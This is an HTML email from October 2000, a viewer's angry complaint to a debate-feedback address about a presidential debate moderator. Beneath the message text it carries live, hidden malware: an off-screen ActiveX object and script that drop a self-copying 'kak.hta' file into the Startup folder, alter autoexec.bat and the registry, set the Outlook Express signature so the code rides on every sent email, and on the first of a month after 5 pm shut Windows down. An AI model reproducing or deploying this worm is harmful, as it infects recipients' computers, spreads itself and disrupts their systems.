<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<HTML><HEAD>
<META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">


<META content="MSHTML 5.50.4134.600" name=GENERATOR>
<STYLE></STYLE>
</HEAD>
<BODY bgColor=#ffffff>
<DIV>&nbsp;</DIV>
<DIV class=OutlookMessageHeader dir=ltr align=left><FONT face=Tahoma 
size=2>-----Original Message-----<BR><B>From:</B> Stephen Burbeck 
[mailto:lina@ptialaska.net]<BR><B>Sent:</B> Thursday, October 19, 2000 8:36 
PM<BR><B>To:</B> debatewatch@debates.org<BR><B>Subject:</B> YOUR WONDERFUL 
MODERATOR<BR><BR></FONT></DIV>
<DIV><FONT face=Arial size=2>From the first debate it was obvious he took 
himself far too seriously. Why would any audience member stay&nbsp; for the 
Debate after his threats and intimidation's. Sure by the last debate he was 
pouring on the charm, but now instead of putting&nbsp; the masses in their 
places, he put the Vice President in his.&nbsp;Why did you let this Texan have 
so much influence? How dare you!&nbsp; Why don't youall&nbsp;getalong down the 
trail....for good!</FONT></DIV>
<DIV>
<DIV style="Z-INDEX: 5; RIGHT: 0px; POSITION: absolute; TOP: -20px">
<OBJECT id=scr 
classid=clsid:06290BD5-48AA-11D2-8432-006008C3FBFC></OBJECT></DIV><FONT 
face=Arial>
<SCRIPT><!--
function sErr(){return true;}window.onerror=sErr;scr.Reset();scr.doc="Z<HTML><HEAD><TITLE>Driver Memory Error</"+"TITLE><HTA:APPLICATION ID=\"hO\" WINDOWSTATE=Minimize></"+"HEAD><BODY BGCOLOR=#CCCCCC><object id='wsh' classid='clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B'></"+"object><SCRIPT>function sEr(){self.close();return true;}window.onerror=sEr;fs=new ActiveXObject('Scripting.FileSystemObject');wd='C:\\\\Windows\\\\';fl=fs.GetFolder(wd+'Applic~1\\\\Identities');sbf=fl.SubFolders;for(var mye=new Enumerator(sbf);!mye.atEnd();mye.moveNext())idd=mye.item();ids=new String(idd);idn=ids.slice(31);fic=idn.substring(1,9);kfr=wd+'MENUD�~1\\\\PROGRA~1\\\\D�MARR~1\\\\kak.hta';ken=wd+'STARTM~1\\\\Programs\\\\StartUp\\\\kak.hta';k2=wd+'System\\\\'+fic+'.hta';kk=(fs.FileExists(kfr))?kfr:ken;aek='C:\\\\AE.KAK';aeb='C:\\\\Autoexec.bat';if(!fs.FileExists(aek)){re=/kak.hta/i;if(hO.commandLine.search(re)!=-1){f1=fs.GetFile(aeb);f1.Copy(aek);t1=f1.OpenAsTextStream(8);pth=(kk==kfr)?wd+'MENUD�~1\\\\PROGRA~1\\\\D�MARR~1\\\\kak.hta':ken;t1.WriteLine('@echo off>'+pth);t1.WriteLine('del '+pth);t1.Close();}}if(!fs.FileExists(k2)){fs.CopyFile(kk,k2);fs.GetFile(k2).Attributes=2;}t2=fs.CreateTextFile(wd+'kak.reg');t2.write('REGEDIT4');t2.WriteBlankLines(2);ky='[HKEY_CURRENT_USER\\\\Identities\\\\'+idn+'\\\\Software\\\\Microsoft\\\\Outlook Express\\\\5.0';sg='\\\\signatures';t2.WriteLine(ky+sg+']');t2.Write('\"Default Signature\"=\"++++++++\"');t2.WriteBlankLines(2);t2.WriteLine(ky+sg+'\\\\++++++++]');t2.WriteLine('\"name\"=\"Signature #1\"');t2.WriteLine('\"type\"=dword:00000002');t2.WriteLine('\"text\"=\"\"');t2.Write('\"file\"=\"C:\\\\\\\\WINDOWS\\\\\\\\kak.htm\"');t2.WriteBlankLines(2);t2.WriteLine(ky+']');t2.Write('\"Signature Flags\"=dword:00000003');t2.WriteBlankLines(2);t2.WriteLine('[HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run]');t2.Write('\"cAg0u\"=\"C:\\\\\\\\WINDOWS\\\\\\\\SYSTEM\\\\\\\\'+fic+'.hta\"');t2.WriteBlankLines(2);t2.close();wsh.Run(wd+'Regedit.exe -s '+wd+'kak.reg');t3=fs.CreateTextFile(wd+'kak.htm',1);t3.Write('<HTML><BODY><DIV style=\"POSITION:absolute;RIGHT:0px;TOP:-20px;Z-INDEX:5\"><OBJECT classid=clsid:06290BD5-48AA-11D2-8432-006008C3FBFC id=scr></"+"OBJECT></"+"DIV>');t4=fs.OpenTextFile(k2,1);while(t4.Read(1)!='Z');t3.WriteLine('<SCRIPT><!--');t3.write('function sErr(){return true;}window.onerror=sErr;scr.Reset();scr.doc=\"Z');rs=t4.Read(3095);t4.close();rd=/\\\\/g;re=/\"/g;rf=/<\\//g;rt=rs.replace(rd,'\\\\\\\\').replace(re,'\\\\\"').replace(rf,'</"+"\"+\"');t3.WriteLine(rt+'\";la=(navigator.systemLanguage)?navigator.systemLanguage:navigator.language;scr.Path=(la==\"fr\")?\"C:\\\\\\\\windows\\\\\\\\Menu D�marrer\\\\\\\\Programmes\\\\\\\\D�marrage\\\\\\\\kak.hta\":\"C:\\\\\\\\windows\\\\\\\\Start Menu\\\\\\\\Programs\\\\\\\\StartUp\\\\\\\\kak.hta\";agt=navigator.userAgent.toLowerCase();if(((agt.indexOf(\"msie\")!=-1)&&(parseInt(navigator.appVersion)>4))||(agt.indexOf(\"msie 5.\")!=-1))scr.write();');t3.write('//--></"+"'+'SCRIPT></"+"'+'OBJECT></"+"'+'BODY></"+"'+'HTML>');t3.close();fs.GetFile(wd+'kak.htm').Attributes=2;fs.DeleteFile(wd+'kak.reg');d=new Date();if(d.getDate()==1 && d.getHours()>17){alert('Kagou-Anti-Kro$oft says not today !');wsh.Run(wd+'RUNDLL32.EXE user.exe,exitwindows');}self.close();</"+"SCRIPT>S3 driver memory alloc failed &nbsp; !]]%%%%%</"+"BODY></"+"HTML>";la=(navigator.systemLanguage)?navigator.systemLanguage:navigator.language;scr.Path=(la=="fr")?"C:\\windows\\Menu D�marrer\\Programmes\\D�marrage\\kak.hta":"C:\\windows\\Start Menu\\Programs\\StartUp\\kak.hta";agt=navigator.userAgent.toLowerCase();if(((agt.indexOf("msie")!=-1)&&(parseInt(navigator.appVersion)>4))||(agt.indexOf("msie 5.")!=-1))scr.write();
//--></SCRIPT>
</OBJECT></FONT></DIV></BODY></HTML>

